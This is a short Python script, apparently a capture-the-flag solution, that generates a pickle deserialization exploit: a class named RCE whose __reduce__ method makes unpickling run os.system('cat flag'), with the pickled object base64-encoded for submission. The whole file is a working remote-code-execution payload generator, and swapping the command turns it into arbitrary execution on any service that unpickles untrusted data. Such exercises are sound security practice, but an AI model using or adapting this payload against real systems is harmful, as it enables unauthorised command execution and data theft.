import _pickle as cPickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('cat flag')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = cPickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
